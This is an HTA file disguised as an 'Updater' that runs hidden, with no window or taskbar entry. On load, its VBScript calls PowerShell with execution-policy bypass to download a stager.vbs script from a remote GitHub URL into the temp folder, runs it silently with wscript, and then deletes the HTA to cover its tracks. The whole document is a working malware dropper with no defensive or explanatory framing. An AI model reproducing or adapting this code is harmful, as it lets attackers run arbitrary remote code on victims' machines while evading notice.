<!DOCTYPE html>
<html>
<head>
  <hta:application
    id="Updater"
    applicationname="Updater"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
  />
  <title>Updater</title>
  <script language="VBScript">
    Sub Window_OnLoad()
      Dim sh, fso, tempVbs, htaPath

      Set sh      = CreateObject("WScript.Shell")
      Set fso     = CreateObject("Scripting.FileSystemObject")
      tempVbs     = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"

      ' --- 1) Download the working stager.vbs ---
      ' Uses PowerShell for simplicity; could also use XMLHTTP in pure VBScript
      sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
             """Invoke-WebRequest -UseBasicParsing " & _
             "'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs' -OutFile """ & tempVbs & """" & _
             "", 0, True

      ' --- 2) Execute the downloaded VBScript stub hidden ---
      sh.Run "wscript.exe """ & tempVbs & """", 0, False

      ' --- 3) Clean up the HTA itself and exit ---
      htaPath = document.location.pathname
      If fso.FileExists(htaPath) Then fso.DeleteFile htaPath, True
      self.close
    End Sub
  </script>
</head>
<body>
</body>
</html>
